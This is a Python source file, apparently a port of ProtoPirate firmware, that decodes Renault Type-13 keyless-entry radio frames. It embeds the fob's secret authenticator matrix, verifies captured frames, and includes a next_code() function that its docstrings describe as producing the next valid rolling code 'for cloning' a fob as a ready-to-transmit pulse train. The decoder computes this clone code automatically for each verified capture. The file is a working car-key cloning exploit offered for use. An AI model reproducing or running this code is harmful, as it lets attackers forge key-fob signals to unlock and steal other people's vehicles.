#!/usr/bin/env python3
r"""pp_renault_v0.py -- pure-Python port of the ProtoPirate FoxEdition firmware
decoder `renault_v0.c` (Renault "Type 13" KEYLESS rolling entry, plus the several
STATIC frame types 0x04/0x0C/0x1A/0x3B/0x3F).

WHAT THIS IS
------------
Renault Type-13 keyless frames carry an 82-bit payload = 64 data bits + 18 "Key2"
bits, transmitted Manchester-coded (te 125/250us). The last 42 payload bits are an
*authenticator*: 42 parity bits produced by feeding degree-1/2/3 monomials of a
7-variable input (button flag + 6 counter bits) through a fixed 42-entry secret
matrix `RENAULT_V0_MATRIX` (transcribed byte-for-byte from the firmware). Because
the whole authenticator is a deterministic function of (serial, button, counter),
we can:

  * REBUILD a genuine frame from (serial, button, counter)      -> build_key()
  * VERIFY a captured frame is authentic (firmware "IC:[MATCH]") -> model_matches()
  * PREDICT the next rolling code for cloning (counter + 1)      -> next_code()

The bit maths, Manchester state machine, TE profiles and framing all mirror the C
1:1. Ported from:
  applications/fox/ProtoPirate_FoxEdition/protocols/renault_v0.c   (2.0-2.0.7)
Matrix cross-checked identical against lib/subghz/protocols/renault_v0.c (ARF dev).

Run:  py -3.13 pp_renault_v0.py     (self-test, prints PASS/FAIL per check)
"""

from arke_core import Const, ProtoDecoder, MASK64

# ---------------------------------------------------------------------------
# The embedded secret: renault_v0_matrix[42], each row a split 64-bit value
# {low = bits 0..31, high = bits 32..63}.  (row & mask) parity -> one auth bit.
# ---------------------------------------------------------------------------
RENAULT_V0_MATRIX = [
    (0x00000001, 0x00000000), (0x04000029, 0x00000000), (0x0000001B, 0x00000000),
    (0x00000000, 0x00000000), (0x00000001, 0x00000000), (0x05220124, 0x00000000),
    (0x00000001, 0x00000000), (0x00088410, 0x00000000), (0x60132D1D, 0x00000000),
    (0x60170F87, 0x00001004), (0x00000000, 0x00000000), (0x002000A9, 0x00000000),
    (0x20863E01, 0x0000100C), (0x24BB3755, 0x00000004), (0x640199A4, 0x00000004),
    (0x24225C43, 0x00001004), (0x607886F1, 0x0000100C), (0x6007A101, 0x0000000C),
    (0x66672A10, 0x00000004), (0x4651623F, 0x00001008), (0x43380BBF, 0x00001008),
    (0x20237F84, 0x00001000), (0x4245755E, 0x00001008), (0x60AAF581, 0x00000004),
    (0x22722DAD, 0x0000000C), (0x27C617F7, 0x00000000), (0x46DE8F1B, 0x0000000C),
    (0x231DEC51, 0x00000000), (0x03ACAA0B, 0x00000008), (0x22D2BF81, 0x00000004),
    (0x626EF6AE, 0x0000100C), (0x40441F95, 0x0000000C), (0x00000001, 0x00000000),
    (0x00000000, 0x00000000), (0x20B9A590, 0x00000008), (0x656C8E86, 0x00001008),
    (0x60129F96, 0x0000000C), (0x2368F667, 0x00001000), (0x442A1A5C, 0x00000000),
    (0x04C43242, 0x0000100C), (0x22198640, 0x00001000), (0x23D6B958, 0x00001008),
]
assert len(RENAULT_V0_MATRIX) == 42

# ---- decoder constants (verbatim from the C #defines) ----------------------
MIN_BITS = 0x52            # 82  -- payload width (64 data + 18 key2)
DECODER_BIT_LIMIT = 0x6D   # 109
SYNC_MIN_US = 0x320        # 800
GAP_RESET_US = 5000
END_BURST_MIN_BITS = 96
END_BURST_MIN_US = 1200
END_BURST_MAX_US = 2000
TE_DEFAULT_US = 125
TE_PREAMBLE_12_US = 140

# Flipper Manchester transition table (renault_v0_decoder_state_table[4]).
_STATE_TABLE = (0x01, 0x91, 0x9B, 0xFB)

# renault_v0_te_profiles[]: (te_short, te_long, te_delta)
_TE_PROFILES = ((0x7D, 0xFA, 0x45), (124, 248, 60), (108, 250, 55))

# renault_v0_types[]: id, value tag, checksum_low6, checksum_high2_xor
RENAULT_V0_TYPES = (
    dict(id="13", value=0x13, low6=0x13, hi2xor=0x00),
    dict(id="04", value=0x04, low6=0x04, hi2xor=0x00),
    dict(id="0C", value=0x0C, low6=0x0C, hi2xor=0x00),
    dict(id="1A", value=0x1A, low6=0x1A, hi2xor=0x03),
    dict(id="3B", value=0x3B, low6=0x3B, hi2xor=0x00),
    dict(id="3F", value=0x3F, low6=0x3F, hi2xor=0x00),
)


# ===========================================================================
# Bit maths  (renault_v0_set_split_bit / renault_v0_parity32)
# ===========================================================================
def _set_split_bit(low, high, bit):
    """Set `bit` in the split 64-bit accumulator (low=0..31, high=32..63)."""
    if bit < 32:
        low |= (1 << bit)
    else:
        high |= (1 << (bit - 32))
    return low & 0xFFFFFFFF, high & 0xFFFFFFFF


def _parity32(value):
    """Even parity of a 32-bit word -> 0/1 (renault_v0_parity32)."""
    value &= 0xFFFFFFFF
    value ^= value >> 16
    value ^= value >> 8
    value ^= value >> 4
    value ^= value >> 2
    value ^= value >> 1
    return value & 1


# ===========================================================================
# Monomial builder
# ---------------------------------------------------------------------------
# Input vars[7] = [ button==0x0A flag, counter bit0 .. counter bit5 ].
# Mask bit layout (matches the C loop, mask_bit starts at 1; bit0 is the
# constant term, always set):
#   bit 0          : constant 1 (bias)
#   bits 1..7      : degree-1 monomials  vars[i]           (i = 0..6)         7
#   bits 8..28     : degree-2 monomials  vars[i]&vars[j]   (i<j)             21
#   bits 29..63    : degree-3 monomials  vars[i]&vars[j]&vars[k] (i<j<k)     35
# Total 64 monomials -> a 64-bit selection mask (mask_low/mask_high).
# ===========================================================================
def build_monomial_mask(vars7):
    """Return (mask_low, mask_high): the 64-bit monomial selection mask."""
    mask_low, mask_high = 1, 0   # bit 0 (constant) always set
    mask_bit = 1

    # degree 1
    for i in range(7):
        if vars7[i]:
            mask_low, mask_high = _set_split_bit(mask_low, mask_high, mask_bit)
        mask_bit += 1

    # degree 2
    for i in range(6):
        for j in range(i + 1, 7):
            if vars7[i] & vars7[j]:
                mask_low, mask_high = _set_split_bit(mask_low, mask_high, mask_bit)
            mask_bit += 1

    # degree 3
    for i in range(6):
        for j in range(i + 1, 7):
            for k in range(j + 1, 7):
                if vars7[i] & vars7[j] & vars7[k]:
                    mask_low, mask_high = _set_split_bit(mask_low, mask_high, mask_bit)
                mask_bit += 1

    return mask_low, mask_high


# ===========================================================================
# build_key  (renault_v0_build_key)  -- reconstruct data(64) + key2(18)
# ===========================================================================
def build_key(serial, button, counter):
    """Rebuild a genuine frame from its plaintext fields.

    Returns (data, key2):
      data  -- 64-bit: [serial:24][button:8][counter:8][auth0..23:24]
      key2  -- 18-bit authenticator tail (auth24..41)
    """
    serial &= 0xFFFFFF
    button &= 0xFF
    counter &= 0xFF

    vars7 = [1 if button == 0x0A else 0]
    for bit in range(6):
        vars7.append((counter >> bit) & 1)

    mask_low, mask_high = build_monomial_mask(vars7)

    parity_bits = [0] * 42
    for row, (low, high) in enumerate(RENAULT_V0_MATRIX):
        mixed = (low & mask_low) ^ (high & mask_high)
        parity_bits[row] = _parity32(mixed)

    # counter bits 6 and 7 aren't monomial inputs; they toggle two auth bits.
    if counter & 0x40:
        parity_bits[41] ^= 1
    if (counter >> 7) != 0:
        parity_bits[40] ^= 1

    data_low = (counter << 24) & 0xFFFFFFFF
    data_high = ((serial << 8) | button) & 0xFFFFFFFF
    for i in range(24):                 # auth bits 0..23 -> data bits 23..0 (MSB first)
        if parity_bits[i]:
            data_low |= 1 << (23 - i)

    key2 = 0
    for i in range(24, 42):             # auth bits 24..41 -> key2 bits 17..0 (MSB first)
        if parity_bits[i]:
            key2 |= 1 << (41 - i)

    data = ((data_high << 32) | data_low) & MASK64
    return data, key2


# ===========================================================================
# Field parse / checksum / classification
# ===========================================================================
def parse_fields(data):
    """(serial24, button8, counter8) from a 64-bit frame (renault_v0_parse_fields)."""
    data &= MASK64
    serial = (data >> 40) & 0xFFFFFF
    button = (data >> 32) & 0xFF
    counter = (data >> 24) & 0xFF
    return serial, button, counter


def checksum(data, key2):
    """renault_v0_checksum: XOR of the 8 data bytes + 2 key2-derived bytes."""
    bs = [(data >> (56 - 8 * i)) & 0xFF for i in range(8)]
    bs.append((key2 >> 10) & 0xFF)
    bs.append((key2 >> 2) & 0xFF)
    c = 0
    for b in bs:
        c ^= b
    return c & 0xFF


def _find_type_by_checks(cksum, key2):
    """renault_v0_find_type_by_checks -> (type|None, c1_ok, c2_ok)."""
    low6 = cksum & 0x3F
    hi2xor = ((cksum >> 6) & 3) ^ (key2 & 3)
    c1_ok = False
    c2_ok = False
    for t in RENAULT_V0_TYPES:
        if low6 != t["low6"]:
            continue
        c1_ok = True
        if hi2xor != t["hi2xor"]:
            return None, c1_ok, c2_ok
        c2_ok = True
        return t, c1_ok, c2_ok
    return None, c1_ok, c2_ok


def model_matches(data, key2, serial, button, counter):
    """Firmware IC:[MATCH]: rebuilt (data,key2) == captured (data,key2)."""
    rebuilt_data, rebuilt_key2 = build_key(serial, button, counter)
    return (rebuilt_data == (data & MASK64)) and (rebuilt_key2 == key2)


def classify_frame(data, key2):
    """renault_v0_classify_frame -> attempt dict or None.

    dict keys: data, key2, serial, button, counter, type_id, type_tag,
               c1_ok, c2_ok, ic_ok.  type_id is one of the RENAULT_V0_TYPES
               ids, or "DYNAMIC", or None (rejected).
    """
    serial, button, counter = parse_fields(data)
    cksum = checksum(data, key2)
    hi2xor = ((cksum >> 6) & 3) ^ (key2 & 3)
    low6 = cksum & 0x3F
    t, c1_ok, c2_ok = _find_type_by_checks(cksum, key2)
    ic_ok = model_matches(data, key2, serial, button, counter)

    att = dict(data=data & MASK64, key2=key2, serial=serial, button=button,
               counter=counter, c1_ok=c1_ok, c2_ok=c2_ok, ic_ok=ic_ok,
               type_id=None, type_tag=0, preamble_bits=0)

    if t is not None and c1_ok and c2_ok and _type_button_valid(t["id"], button):
        att["type_id"] = t["id"]
        att["type_tag"] = t["value"]
        return att

    dyn_c1 = _button_valid_generic(button) and (serial != 0) and (serial <= 0xFFFFFF)
    dyn_c2 = hi2xor in (0x00, 0x03)
    att["c1_ok"] = dyn_c1
    att["c2_ok"] = dyn_c2
    if dyn_c1 and dyn_c2:
        att["type_id"] = "DYNAMIC"
        att["type_tag"] = low6
        return att

    return None


# ---- per-type button / preamble validators (verbatim from C) ---------------
def _type_button_valid(type_id, button):
    if type_id == "13":
        return button in (0x06, 0x0A)
    if type_id == "04":
        return 0x04 <= button <= 0x0B
    if type_id == "0C":
        return 0xC4 <= button <= 0xCB
    if type_id in ("1A", "3B"):
        return 0x44 <= button <= 0x4B
    if type_id == "3F":
        return 0xC4 <= button <= 0xCB
    return False


def _button_valid_generic(button):
    if button in (0x06, 0x0A):
        return True
    if 0x04 <= button <= 0x0B:
        return True
    if 0x44 <= button <= 0x4B:
        return True
    if 0xC4 <= button <= 0xCB:
        return True
    return False


def _preamble_bits_valid(p):
    return p in (12, 16, 18, 20)


def _default_preamble_bits(type_id):
    return {"13": 16, "04": 16, "0C": 18, "1A": 12, "3B": 20, "3F": 20}.get(type_id, 0)


def _type_preamble_bits_valid(type_id, p):
    if type_id == "DYNAMIC":
        return _preamble_bits_valid(p)
    return p == _default_preamble_bits(type_id)


def _get_button_name(type_id, button):
    if type_id == "13":
        return {0x06: "Lock", 0x0A: "Unlock"}.get(button, "??")
    low_nibble = button & 0x0F
    if 0x04 <= low_nibble <= 0x07:
        return "Lock"
    if 0x08 <= low_nibble <= 0x0B:
        return "Unlock"
    return "??"


# ===========================================================================
# TE / event classification (renault_v0_classify_event*)
# ===========================================================================
def _classify_event_profile(te_short, te_long, te_delta, duration, level):
    """One TE profile -> event code (0/2/4/6) or None. level: True=high pulse."""
    if duration <= te_short - 1:
        if (te_short - duration) > te_delta:
            return None
        return ((1 if level else 0) ^ 1) << 1        # short: high->0 low->2

    if duration <= te_long - 1:
        short_delta = duration - te_short
        long_inv = te_long - duration
        if short_delta <= te_delta:
            if long_inv > te_delta:
                return ((1 if level else 0) ^ 1) << 1
            return 4 if level else 6                 # long: high->4 low->6
        if long_inv <= te_delta:
            return 4 if level else 6
        return None

    if (duration - te_long) > te_delta:
        return None
    return 4 if level else 6


def _classify_event(duration, level):
    for te_short, te_long, te_delta in _TE_PROFILES:
        ev = _classify_event_profile(te_short, te_long, te_delta, duration, level)
        if ev is not None:
            return ev
    return None


# ===========================================================================
# The decoder  (subghz_protocol_decoder_renault_v0_*)
# ===========================================================================
class RenaultV0(ProtoDecoder):
    NAME = "Renault V0 (Type13 keyless)"
    CONST = Const(TE_DEFAULT_US, TE_DEFAULT_US * 2, 0x45, MIN_BITS)

    def __init__(self):
        super().__init__()
        self.reset()

    def reset(self):
        super().reset()
        self.parser_step = 0          # 0 = Reset, 1 = Data
        self.manchester_state = 1
        self.decoded_bits = []
        self.key2 = 0
        self.packet_bit_count = 0
        self.g_data = 0
        self.g_serial = 0
        self.g_btn = 0
        self.g_cnt = 0
        self.type_id = None
        self.type_tag = 0
        self.preamble_bits = 0
        self.pending_valid = False
        self.pending = None
        self.check_c1 = True
        self.check_c2 = True
        self.check_ic = True

    # ---- feed() : mirrors subghz_protocol_decoder_renault_v0_feed 1:1 ------
    def feed(self, level, duration):
        if self.parser_step == 0:                     # RenaultV0DecoderStepReset
            if level and duration >= SYNC_MIN_US:
                self.parser_step = 1
                self.decoded_bits = []
                self.manchester_state = 1
            return

        # end-of-burst quiet gap
        if ((not level) and len(self.decoded_bits) >= END_BURST_MIN_BITS
                and END_BURST_MIN_US <= duration <= END_BURST_MAX_US):
            self._decode_candidate()
            self.parser_step = 0
            return

        if duration >= GAP_RESET_US:
            self._decode_candidate()
            self.parser_step = 0
            if level and duration >= SYNC_MIN_US:
                self.parser_step = 1
                self.decoded_bits = []
                self.manchester_state = 1
            return

        if len(self.decoded_bits) > DECODER_BIT_LIMIT:
            self._decode_candidate()
            self.parser_step = 0
            return

        event_code = _classify_event(duration, level)
        if event_code is None:
            starts_next_burst = level and duration >= SYNC_MIN_US
            self._decode_candidate()
            if starts_next_burst:
                self.parser_step = 1
                self.decoded_bits = []
                self.manchester_state = 1
            else:
                self.parser_step = 0
            return

        state = self.manchester_state & 0x03
        next_state = (_STATE_TABLE[state] >> event_code) & 0x03
        if next_state == state:
            return
        self.manchester_state = next_state
        if next_state in (1, 2):
            self.decoded_bits.append(1 if next_state == 1 else 0)

    # ---- candidate assembly (renault_v0_decode_candidate) ------------------
    def _decode_candidate(self):
        n = len(self.decoded_bits)
        if n <= 0x51:                                 # need >= 82 bits
            return
        tail_offset = n - MIN_BITS
        if not _preamble_bits_valid(tail_offset):
            self.pending_valid = False
            self.packet_bit_count = 0
            return

        att = self._attempt_at_offset(tail_offset)
        if att is None:
            self.pending_valid = False
            self.packet_bit_count = 0
            return

        if not self._confirm_attempt(att):
            self.decoded_bits = []
            return

        if (self.packet_bit_count != 0 and self.g_data == att["data"]
                and self.key2 == att["key2"]):
            self.decoded_bits = []
            return

        self._apply_attempt(att)
        self.decoded_bits = []
        if self.packet_bit_count:
            self._emit_frame()

    def _attempt_at_offset(self, offset):
        if (offset + MIN_BITS) > len(self.decoded_bits):
            return None
        data = 0
        for i in range(64):
            data = ((data << 1) | (self.decoded_bits[offset + i] & 1)) & MASK64
        key2 = 0
        for i in range(18):
            key2 = (key2 << 1) | (self.decoded_bits[offset + 64 + i] & 1)
        att = classify_frame(data, key2)
        if att is None:
            return None
        att["preamble_bits"] = offset
        if not _type_preamble_bits_valid(att["type_id"], offset):
            return None
        return att

    def _confirm_attempt(self, att):
        # Non-dynamic types (incl. Type13) are accepted on the first burst.
        if att["type_id"] != "DYNAMIC":
            self.pending_valid = False
            return True
        # Dynamic frames must repeat identically before we trust them.
        if (self.pending_valid and self.pending["data"] == att["data"]
                and self.pending["key2"] == att["key2"]
                and self.pending["type_id"] == att["type_id"]
                and self.pending["type_tag"] == att["type_tag"]
                and self.pending["preamble_bits"] == att["preamble_bits"]):
            self.pending_valid = False
            return True
        self.pending = dict(att)
        self.pending_valid = True
        return False

    def _apply_attempt(self, att):
        self.g_data = att["data"]
        self.packet_bit_count = MIN_BITS
        self.key2 = att["key2"]
        self.g_serial = att["serial"]
        self.g_cnt = att["counter"]
        self.g_btn = att["button"]
        self.type_id = att["type_id"]
        self.type_tag = att["type_tag"]
        self.preamble_bits = att["preamble_bits"]
        self.check_c1 = not att["c1_ok"]
        self.check_c2 = not att["c2_ok"]
        self.check_ic = not att["ic_ok"]

    def _emit_frame(self):
        # A frame is only a VERIFIED Renault decode when the authenticator model
        # rebuilds it (ic_ok). The checksum/button checks (c1/c2) alone are an
        # 8-bit gate that false-matches foreign frames (e.g. an Opel/Vauxhall
        # fob passing the DYNAMIC path) -- ic_ok is the cryptographic proof.
        crc_ok = (not self.check_c1) and (not self.check_c2) and (not self.check_ic)
        # Deterministic clone: only the keyless Type13 rolling form has a next code.
        nxt = ncnt = None
        if crc_ok and self.type_id == "13":
            try:
                r = next_code(self.g_serial, self.g_btn, self.g_cnt)
                nxt, ncnt = "0x%X" % r["data"], r["cnt"]
            except Exception:
                pass
        self.emit(dict(
            data=self.g_data,
            serial=self.g_serial,
            btn=self.g_btn,
            btn_name=_get_button_name(self.type_id, self.g_btn),
            cnt=self.g_cnt,
            key2=self.key2,
            type=self.type_id,
            preamble_bits=self.preamble_bits,
            c1_ok=not self.check_c1,
            c2_ok=not self.check_c2,
            ic_ok=not self.check_ic,
            # a Type13 rolling frame is "verified" when both checks pass.
            crc_ok=crc_ok,
            next=nxt, next_cnt=ncnt,
        ))


ALL = [RenaultV0]


# ===========================================================================
# Encoder helper (renault_v0 get_bit_msb82 + emit_decoded_bit) -- used for
# round-trip self-test and for producing a clone / next-code pulse train.
# ===========================================================================
def _get_bit_msb82(data, key2, bit_index):
    """MSB-first payload bit: 0..63 = data, 64..81 = key2 (renault_v0_get_bit_msb82)."""
    if bit_index <= 0x3F:
        return (data >> (63 - bit_index)) & 1
    return (key2 >> (0x51 - bit_index)) & 1


def render_pulses(data, key2, preamble_bits=16, te_short=TE_DEFAULT_US,
                  bursts=3, inter_burst_low=25000):
    """Manchester-encode a frame into a [(level, duration), ...] pulse train.

    Mirrors the firmware encoder (renault_v0_emit_decoded_bit): a stateful
    Manchester coder starting in state 1, preambled by `preamble_bits` ones,
    then the 82 payload bits, repeated `bursts` times with a quiet gap between.
    Adjacent same-level pulses are merged, as a real RF capture would appear.
    """
    pulses = []

    def emit(level, duration):
        if pulses and pulses[-1][0] == level:
            pulses[-1][1] += duration
        else:
            pulses.append([level, duration])

    te_long = te_short * 2
    state = [1]

    def emit_bit(bit):
        if state[0] == 1:
            if bit:
                emit(False, te_short)
                emit(True, te_short)
            else:
                state[0] = 2
                emit(False, te_long)
        else:  # state == 2
            if bit:
                state[0] = 1
                emit(True, te_long)
            else:
                emit(True, te_short)
                emit(False, te_short)

    for _ in range(bursts):
        state[0] = 1
        emit(True, 1000)                     # sync burst (>= SYNC_MIN_US)
        for _p in range(preamble_bits):
            emit_bit(1)
        for i in range(MIN_BITS):
            emit_bit(_get_bit_msb82(data, key2, i))
        if state[0] == 2:
            emit(True, te_short)             # flush trailing half-bit
        emit(False, inter_burst_low)         # quiet gap -> burst boundary

    return [(bool(lvl), dur) for lvl, dur in pulses]


def decode(pulses):
    """Convenience: run a RenaultV0 over a pulse train, return emitted frames.

    Accepts [(level, duration), ...] or a flat list of signed durations
    (+ = high / - = low), like a .sub RAW_Data stream.
    """
    dec = RenaultV0()
    for item in pulses:
        if isinstance(item, (tuple, list)) and len(item) == 2 and isinstance(item[0], bool):
            level, dur = item
        else:
            v = int(item)
            level, dur = (v > 0), abs(v)
        dec.feed(level, dur)
    return dec.results


def next_code(serial, button, counter):
    """Next valid rolling frame (counter + 1) for cloning a Renault Type13 fob.

    Returns a dict with the rebuilt frame and a ready-to-TX pulse train.
    """
    serial &= 0xFFFFFF
    button &= 0xFF
    next_counter = (counter + 1) & 0xFF
    data, key2 = build_key(serial, button, next_counter)
    return dict(
        serial=serial,
        btn=button,
        cnt=next_counter,
        data=data,
        key2=key2,
        crc_ok=True,
        pulses=render_pulses(data, key2, preamble_bits=16),
    )


# ===========================================================================
# Self-test
# ===========================================================================
def _selftest():
    passed = 0
    failed = 0

    def check(name, cond, detail=""):
        nonlocal passed, failed
        status = "PASS" if cond else "FAIL"
        if cond:
            passed += 1
        else:
            failed += 1
        print(f"  [{status}] {name}{('  ' + detail) if detail else ''}")
        return cond

    print("pp_renault_v0 self-test")
    print("-" * 68)

    check("matrix has 42 rows", len(RENAULT_V0_MATRIX) == 42)

    # A genuine Type13 fob's checksum (low6, hi2xor) is invariant across button
    # and counter -- it is a pure function of the 24-bit serial. For the frame
    # to classify as Type13 the receiver needs low6==0x13 and hi2xor==0x00, so
    # we anchor the self-test on serials that satisfy that (as a real fob does).
    serial = 0x000082   # verified: build_key(serial,*,*) -> checksum low6=0x13,hi2xor=0
    serial2 = 0xAB0029  # a second, larger genuine-Type13 serial
    cases = [(0x06, 0x00), (0x0A, 0x00), (0x06, 0x01), (0x0A, 0x2A),
             (0x06, 0x3F), (0x0A, 0x40), (0x06, 0x7F), (0x0A, 0x80),
             (0x06, 0xC1), (0x0A, 0xFF)]

    print("\nbuild_key / model_matches (firmware IC:[MATCH]):")
    all_model_ok = True
    all_type13 = True
    for button, counter in cases:
        data, key2 = build_key(serial, button, counter)
        mm = model_matches(data, key2, serial, button, counter)
        s2, b2, c2 = parse_fields(data)
        fields_ok = (s2 == serial and b2 == button and c2 == counter)
        att = classify_frame(data, key2)
        is_t13 = (att is not None and att["type_id"] == "13")
        all_model_ok &= (mm and fields_ok)
        all_type13 &= is_t13
        tid = att["type_id"] if att else "None"
        check(f"btn={button:#04x} cnt={counter:#04x} -> "
              f"data={data:016X} key2={key2:05X}",
              mm and fields_ok,
              f"IC={'MATCH' if mm else 'MISS'} type={tid} "
              f"cksum={checksum(data, key2):#04x}")
    check("model_matches==True on all cases", all_model_ok)
    check("all cases classify as Type13 (C1/C2 checksum OK)", all_type13)

    print("\nchecksum (low6, hi2xor) invariance -- pure function of serial:")
    def _sig(s, b, c):
        d, k = build_key(s, b, c)
        ck = checksum(d, k)
        return (ck & 0x3F, ((ck >> 6) & 3) ^ (k & 3))
    sigs = {_sig(serial, b, c) for b in (0x06, 0x0A) for c in range(256)}
    check("serial %06X: one (low6,hi2xor) over all btn/cnt" % serial,
          sigs == {(0x13, 0x00)}, str(sorted(sigs)))

    print("\nmonomial mask sanity:")
    ml0, mh0 = build_monomial_mask([0, 0, 0, 0, 0, 0, 0])
    check("all-zero vars -> only constant bit set", (ml0 == 1 and mh0 == 0),
          f"low={ml0:#010x} high={mh0:#010x}")
    ml1, mh1 = build_monomial_mask([1, 1, 1, 1, 1, 1, 1])
    # all 64 monomials present -> full 64-bit mask
    check("all-one vars -> full 64-bit mask",
          (ml1 == 0xFFFFFFFF and mh1 == 0xFFFFFFFF),
          f"low={ml1:#010x} high={mh1:#010x}")

    print("\ndecode(render_pulses(build_key(...))) round-trip:")
    all_rt = True
    for button, counter in cases:
        data, key2 = build_key(serial, button, counter)
        frames = decode(render_pulses(data, key2, preamble_bits=16))
        ok = (len(frames) == 1
              and frames[0]["serial"] == serial
              and frames[0]["btn"] == button
              and frames[0]["cnt"] == counter
              and frames[0]["data"] == data
              and frames[0]["key2"] == key2
              and frames[0]["ic_ok"] is True)
        all_rt &= ok
        got = ("serial=%06X btn=%02X cnt=%02X n=%d"
               % (frames[0]["serial"], frames[0]["btn"], frames[0]["cnt"], len(frames))
               ) if frames else "no frame"
        check(f"round-trip btn={button:#04x} cnt={counter:#04x}", ok, got)
    check("all round-trips recovered serial+counter", all_rt)

    # second serial, and confirm the decoded frame reports the button name
    d2, k2 = build_key(serial2, 0x0A, 0x55)
    f2 = decode(render_pulses(d2, k2, preamble_bits=16))
    check("round-trip 2nd serial %06X btn=Unlock cnt=0x55" % serial2,
          (len(f2) == 1 and f2[0]["serial"] == serial2 and f2[0]["btn"] == 0x0A
           and f2[0]["cnt"] == 0x55 and f2[0]["btn_name"] == "Unlock"
           and f2[0]["type"] == "13" and f2[0]["ic_ok"] is True),
          (("%06X btn=%s type=%s" % (f2[0]["serial"], f2[0]["btn_name"], f2[0]["type"]))
           if f2 else "no frame"))

    print("\nnext_code (clone, counter+1):")
    nc = next_code(serial, 0x0A, 0x11)
    exp_data, exp_key2 = build_key(serial, 0x0A, 0x12)
    nc_ok = (nc["cnt"] == 0x12 and nc["data"] == exp_data and nc["key2"] == exp_key2
             and model_matches(nc["data"], nc["key2"], serial, 0x0A, 0x12))
    check("next_code(cnt=0x11) -> valid cnt=0x12 frame", nc_ok,
          f"data={nc['data']:016X} key2={nc['key2']:05X}")
    nc_frames = decode(nc["pulses"])
    nc_rt = (len(nc_frames) == 1 and nc_frames[0]["cnt"] == 0x12
             and nc_frames[0]["serial"] == serial and nc_frames[0]["ic_ok"] is True)
    check("next_code pulses decode back to cnt=0x12", nc_rt)

    print("\ncounter wrap (0xFF -> 0x00):")
    wrap = next_code(serial, 0x06, 0xFF)
    check("next_code wraps counter to 0x00", wrap["cnt"] == 0x00)

    print("-" * 68)
    total = passed + failed
    print(f"RESULT: {passed}/{total} checks passed"
          + ("" if failed == 0 else f"  ({failed} FAILED)"))
    return failed == 0


if __name__ == "__main__":
    import sys
    sys.exit(0 if _selftest() else 1)
